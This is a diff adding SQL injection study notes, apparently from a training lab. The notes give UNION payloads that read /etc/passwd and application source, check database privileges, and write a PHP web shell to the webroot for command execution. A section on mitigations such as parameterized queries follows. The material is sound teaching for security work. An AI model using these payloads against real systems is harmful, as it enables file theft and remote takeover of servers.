@@ -734,3 +734,189 @@ Now that we have all the information, we can form our UNION query to dump data o
 ```
 cn' UNION select 1, username, password, 4 from dev.credentials-- -
 ```
+# Reading Files
+## Privileges
+Reading data is much more common than writing data, which is strictly reserved for privileged users in modern DBMSes, as it can lead to system exploitation, as we will see. For example, in MySQL, the DB user must have the FILE privilege to load a file's content into a table and then dump data from that table and read files.
+
+First, we have to determine which user we are within the database. While we do not necessarily need database administrator (DBA) privileges to read data, this is becoming more required in modern DBMSes, as only DBA are given such privileges.
+
+If we do have DBA privileges, then it is much more probable that we have file-read privileges. If we do not, then we have to check our privileges to see what we can do. To be able to find our current DB user, we can use any of the following queries:
+```
+SELECT USER()
+SELECT CURRENT_USER()
+SELECT user from mysql.user
+```
+
+Our UNION injection payload will be as follows:
+```
+' UNION SELECT 1, user(), 3, 4-- -
+
+OR
+
+' UNION SELECT 1, user, 3, 4 from mysql.user-- -
+```
+### User Privileges
+Now that we know our user, we can start looking for what privileges we have with that user. First of all, we can test if we have super admin privileges with the following query:
+
+```
+SELECT super_priv FROM mysql.user
+
+UNION
+
+cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
+
+cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="current user"-- -
+```
+
+The query returns Y, which means YES, indicating superuser privileges. We can also dump other privileges we have directly from the schema, with the following query:
+
+```
+cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
+
+cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'current user'@'localhost'"-- -
+```
+
+## LOAD_FILE
+The LOAD_FILE() function can be used in MariaDB / MySQL to read data from files. The function takes in just one argument, which is the file name. The following query is an example of how to read the /etc/passwd file:
+```
+SELECT LOAD_FILE('/etc/passwd');
+
+cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
+```
+
+The default Apache webroot is /var/www/html. Let us try reading the source code of the file at /var/www/html/search.php.
+```
+cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
+```
+# Writing Files
+Modern DBMSes disable file-write by default and require certain privileges for DBA's to write files. Before writing files, we must first check if we have sufficient rights and if the DBMS allows writing files.
+
+## Write File Privileges
+To be able to write files to the back-end server using a MySQL database, we require three things:
+
+- User with FILE privilege enabled
+- MySQL global secure_file_priv variable not enabled
+- Write access to the location we want to write to on the back-end server
+
+### secure_file_priv
+The secure_file_priv variable is used to determine where to read/write files from. An empty value lets us read files from the entire file system. Otherwise, if a certain directory is set, we can only read from the folder specified by the variable. On the other hand, NULL means we cannot read/write from any directory. MariaDB has this variable set to empty by default, which lets us read/write to any file if the user has the FILE privilege. However, MySQL uses /var/lib/mysql-files as the default folder. This means that reading files through a MySQL injection isn't possible with default settings. Even worse, some modern configurations default to NULL, meaning that we cannot read/write files anywhere within the system.
+
+As we are using a UNION injection, we have to get the value using a SELECT statement. This shouldn't be a problem, as all variables and most configurations' are stored within the INFORMATION_SCHEMA database. MySQL global variables are stored in a table called global_variables, and as per the documentation, this table has two columns variable_name and variable_value.
+
+We have to select these two columns from that table in the INFORMATION_SCHEMA database. There are hundreds of global variables in a MySQL configuration, and we don't want to retrieve all of them. We will then filter the results to only show the secure_file_priv variable, using the WHERE clause we learned about in a previous section.
+```
+Original Query
+SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
+
+UNION Query
+cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
+```
+If the result shows that the secure_file_priv value is empty, it means that we can read/write files to any location.
+
+### SELECT INTO OUTFILE
+The SELECT INTO OUTFILE statement can be used to write data from select queries into files. This is usually used for exporting data from tables.
+
+To use it, we can add INTO OUTFILE '...' after our query to export the results into the file we specified. The below example saves the output of the users table into the /tmp/credentials file:
+```
+SELECT * from users INTO OUTFILE '/tmp/credentials';
+
+thossa00@htb[/htb]$ cat /tmp/credentials 
+
+1       admin   392037dbba51f692776d6cefb6dd546d
+2       newuser 9da2c9bcdf39d8610954e0e11ea8f45f
+```
+It is also possible to directly SELECT strings into files, allowing us to write arbitrary files to the back-end server.
+```
+SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
+
+thossa00@htb[/htb]$ ls -la /tmp/test.txt 
+
+-rw-rw-rw- 1 mysql mysql 15 Jul  8 06:20 /tmp/test.txt
+```
+
+## Writing Files through SQL Injection
+To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use load_file to read the server configuration, like Apache's configuration found at /etc/apache2/apache2.conf, Nginx's configuration at /etc/nginx/nginx.conf, or IIS configuration at %WinDir%\System32\Inetsrv\Config\ApplicationHost.config, or we can search online for other possible configuration locations.
+
+```
+cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
+```
+### Writing a Web Shell
+Having confirmed write permissions, we can go ahead and write a PHP web shell to the webroot folder. We can write the following PHP webshell to be able to execute commands directly on the back-end server:
+```
+<?php system($_REQUEST[0]); ?>
+
+cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
+
+then navigate to http://SERVER_IP:PORT/shell.php?0= with whatever linux command you want (ls, id, cat, pwd, ls ..) URL encoding allows spaces in the URL.
+```
+If we don't see any errors, it means the file write probably worked. This can be verified by browsing to the /shell.php file and executing commands via the 0 parameter, with ?0=id in our URL.
+
+# Mitigating SQL Injection
+## Input Sanitization
+Injection can be avoided by sanitizing any user input, rendering injected queries useless. Libraries provide multiple functions to achieve this, one such example is the mysqli_real_escape_string() function. This function escapes characters such as ' and ", so they don't hold any special meaning.
+```
+<SNIP>
+$username = mysqli_real_escape_string($conn, $_POST['username']);
+$password = mysqli_real_escape_string($conn, $_POST['password']);
+
+$query = "SELECT * FROM logins WHERE username='". $username. "' AND password = '" . $password . "';" ;
+echo "Executing query: " . $query . "<br /><br />";
+<SNIP>
+```
+
+## Input Validation
+User input can also be validated based on the data used to query to ensure that it matches the expected input. For example, when taking an email as input, we can validate that the input is in the form of ...@email.com, and so on.
+
+A regular expression can be used for validating the input:
+```
+<SNIP>
+$pattern = "/^[A-Za-z\s]+$/";
+$code = $_GET["port_code"];
+
+if(!preg_match($pattern, $code)) {
+  die("</table></div><p style='font-size: 15px;'>Invalid input! Please try again.</p>");
+}
+
+$q = "Select * from ports where port_code ilike '%" . $code . "%'";
+<SNIP>
+```
+The code is modified to use the preg_match() function, which checks if the input matches the given pattern or not. The pattern used is [A-Za-z\s]+, which will only match strings containing letters and spaces. Any other character will result in the termination of the script.
+
+## User Privileges
+As discussed initially, DBMS software allows the creation of users with fine-grained permissions. We should ensure that the user querying the database only has minimum permissions, like SELECT only privileges to query a database.
+
+Superusers and users with administrative privileges should never be used with web applications. These accounts have access to functions and features, which could lead to server compromise.
+
+## Web Application Firewall
+Web Application Firewalls (WAF) are used to detect malicious input and reject any HTTP requests containing them. This helps in preventing SQL Injection even when the application logic is flawed. WAFs can be open-source (ModSecurity) or premium (Cloudflare). Most of them have default rules configured based on common web attacks. For example, any request containing the string INFORMATION_SCHEMA would be rejected, as it's commonly used while exploiting SQL injection.
+
+## Parameterized Queries
+Another way to ensure that the input is safely sanitized is by using parameterized queries. Parameterized queries contain placeholders for the input data, which is then escaped and passed on by the drivers. Instead of directly passing the data into the SQL query, we use placeholders and then fill them with PHP functions.
+```
+<SNIP>
+  $username = $_POST['username'];
+  $password = $_POST['password'];
+
+  $query = "SELECT * FROM logins WHERE username=? AND password = ?" ;
+  $stmt = mysqli_prepare($conn, $query);
+  mysqli_stmt_bind_param($stmt, 'ss', $username, $password);
+  mysqli_stmt_execute($stmt);
+  $result = mysqli_stmt_get_result($stmt);
+
+  $row = mysqli_fetch_array($result);
+  mysqli_stmt_close($stmt);
+<SNIP>
+```
+The query is modified to contain two placeholders, marked with ? where the username and password will be placed. We then bind the username and password to the query using the mysqli_stmt_bind_param() function. This will safely escape any quotes and place the values in the query.
+
+# Final Assessment
+
+1. Bypass authentication with OR statement and comment
+2. Confirm number of columns in table through union injection.
+3. Check database version for right queries.
+4. Check database schema to confirm database names.
+5. Check current user permissions.
+6. Read global file like /etc/passwd
+7. Write file to current directory (check URL for current directory) /var/www/html/'current directory'
+8. Create a web shell to gain access to the system.
+9. Navigate to root directory to find flag.
